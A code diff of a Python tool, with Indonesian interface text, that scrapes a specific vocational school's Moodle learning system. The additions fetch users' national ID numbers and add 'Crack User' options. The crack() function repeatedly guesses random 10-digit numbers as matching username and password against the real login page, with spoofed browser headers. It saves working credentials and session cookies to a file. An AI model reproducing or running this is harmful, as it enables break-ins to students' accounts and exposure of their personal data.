@@ -1,12 +1,11 @@
 
-import requests
+import requests,random
 import time
 import re,os,json
-from rich.console import Console
 from bs4 import BeautifulSoup
 from rich import print as prints
 from rich.panel import Panel
-from rich.table import Table
+from rich.table import Table as me
 from rich.tree import Tree
 import urllib3
 import certifi
@@ -15,11 +14,18 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+from rich.console import Console as sol,Console
+from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn, SpinnerColumn
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.columns import Columns as col, Columns
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
 console = Console()
 session = requests.Session()
+Meledakcik=[]
+
 
 def check_token_cookie():
     try:
@@ -102,8 +108,8 @@ def login():
             prints(Panel.fit("[bold red]Username atau password salah, coba lagi!"))
     except Exception as e:
         prints(Panel.fit(f"[bold red]Terjadi kesalahan: {str(e)}"))
-        
-        
+
+
 def menu():
     os.system("clear")
     try:
@@ -122,13 +128,31 @@ def menu():
         user_name = user_element.text.strip()
     else:
         user_name = "Pengguna Tidak Diketahui"
-    prints(Panel.fit(f"[bold green] Selamat Menggunakan Script Scraping Web LMS SMKN4 PADALARANG [bold white]\n\n\t Selamat Datang [bold blue]{user_name}[bold white] "))
-    prints(Panel.fit("[bold white]1.[bold green] Cek Profile\n[bold white]2.[bold green] Edit Profile\n[bold white]3.[bold green] Cek Kehadiran\n[bold white]4.[bold green] Cek kelas\n[bold white]5.[bold green] Cek Report\n[bold white]6.[bold green] Change Password\n[bold white]7.[bold green] Automatic Absen\n[bold white]0.[bold red] exit[bold white]"))
+        
+    urlvalue = "https://lms.smkn4padalarang.sch.id/user/edit.php"
+    response_2 = session.get(urlvalue, verify=False)
+    soup_2 = BeautifulSoup(response_2.text, 'html.parser')
+    user_element_2 = soup_2.find('input', {'id': 'id_profile_field_NIK'})
+    if user_element_2 and 'value' in user_element_2.attrs:
+        user_name_2 = user_element_2['value'].strip()  # Mengambil value dari atribut
+    else:
+        user_name_2 = "Pengguna Tidak Diketahui"
+    Meledakcik.append(Panel(f"[bold green]Nama : [bold white]{user_name}\n[bold green]User NIK : [bold white]{user_name_2}",width=50,style=f"bold green"))
+    console.print(Columns(Meledakcik))
+    Tabel1 = f"[bold white]01\n02\n03\n04\n05\n06\n07\n08\n09\n00"
+    Tabel2 = f"Cek Profile\nEdit Profile\nCek Kehadiran\nCek Kelas\nCek Report\nChange Password\nAutomatic Absen\nCrack User\nCrack File User\nExit"
+    Tabel3 = f"[bold blue]ON\nON\nON\nON\nON\nON\nON\nON\nON\n[bold red]ON"
+    cik = me()
+    cik.add_column(f"[bold white]NO", style="bold green", justify='center')
+    cik.add_column(f"[bold white]PILIHAN", style="bold green", justify='left',width=40)
+    cik.add_column(f"[bold white]STATUS", style="bold green", justify='center')
+    cik.add_row(Tabel1,Tabel2,Tabel3)
+    sol().print(cik, justify='left',style=f"bold green")
     i = input(f"Pilih Menu : ")
     if i == "1":
         profile()
     elif i == "2":
-        print(Panel.fit(f"[bold red]Maaf Menu ini cooming soon karena tahap perbaikan[bold white]"))
+        prints(Panel.fit(f"[bold red]Maaf Menu ini cooming soon karena tahap perbaikan[bold white]"))
     elif i == "3":
         kehadiran()
     elif i == "4":
@@ -139,11 +163,13 @@ def menu():
         autochangepas()
     elif i == "7":
         absensi()
+    elif i == "8":
+        crack()
+    elif i == "9":
+        os.system("python3 crack.py")
     elif i == "0":
         exit()
         
-        
-
 def profile():
     prints(Panel.fit("👨‍🎓 [bold green]Memeriksa Isi Data Profile[/bold green]"))
     try:
@@ -508,7 +534,85 @@ def autochangepas():
     except Exception as e:
         print(f"Terjadi kesalahan: {str(e)}")
 
-        
+def generat():
+    random_number = random.randint(10000000, 100000000 - 1)
+    formatted_number = f"{random_number:010d}"
+    return formatted_number
+
+def crack():
+    while True:
+        try:
+            print('')
+            idf = generat()
+            time.sleep(1)
+            p = session.get("https://lms.smkn4padalarang.sch.id/login/index.php", verify=False)
+            logintoken_match = re.search('name="logintoken" value="(.*?)"', str(p.text))
+            
+            if not logintoken_match:
+                prints(Panel.fit("[bold red]Gagal mendapatkan logintoken, silakan coba lagi!"))
+                return
+            logintoken = logintoken_match.group(1)
+            heade = {
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-User': '?1',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Accept-Encoding': 'gzip, deflate, br, zstd',
+                'Host': 'lms.smkn4padalarang.sch.id',
+                'Referer': 'https://lms.smkn4padalarang.sch.id/',
+                'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'Sec-Ch-Ua-Platform': '"Windows"',
+                'Upgrade-Insecure-Requests': '1',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Cache-Control': 'max-age=0',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+            }
+            data = {
+                "logintoken": logintoken,
+                "username": idf,
+                "password": idf
+            }
+            response = session.post(
+                "https://lms.smkn4padalarang.sch.id/login/index.php",
+                headers=heade,
+                data=data,
+                allow_redirects=True,
+                verify=False
+            )
+
+            if 'Dashboard' in response.text:
+                cookies = "; ".join([
+                    f"{key}={value}"
+                    for key, value in session.cookies.get_dict().items()
+                ])
+                # Output keberhasilan
+                Meledak = Tree(Panel.fit("[bold green]Log in Success"))
+                Meledak.add(Panel.fit(f"[bold green]Username: {idf}, Password: {idf}"))
+                Meledak.add(Panel.fit(f"[bold green]Cookies tersimpan: {cookies}"))
+                try:
+                    session.cookies.update({key: value for key, value in (item.split('=') for item in cookie.split('; '))})
+                    url = "https://lms.smkn4padalarang.sch.id/my/"
+                    response = session.get(url, verify=False)
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    user_element = soup.find('span', class_='usertext')
+                    if user_element:
+                        user_name = user_element.text.strip()
+                    else:
+                        user_name = "Pengguna Tidak Diketahui"
+                except IOError :
+                    prints(Panel.fit(f"Pengguna tidak diketahui"))
+                Meledak.add(Panel.fit(f"[bold green]User Pengguna: {user_name}"))
+                prints(Meledak)
+                open('data-success.txt','a').write(idf+"|"+idf+"\n")
+                break  # Exit loop if login is successful
+            else:
+                prints(Panel.fit(f"[bold red]Username {idf} atau password {idf} salah, coba lagi!"))
+                open('data-fail.txt','a').write(idf+"|"+idf+"\n")
+        except Exception as e:
+            prints(Panel.fit(f"[bold red]Terjadi kesalahan: {str(e)}"))
+
 if __name__ == "__main__":
     os.system("clear")
     if not check_token_cookie():
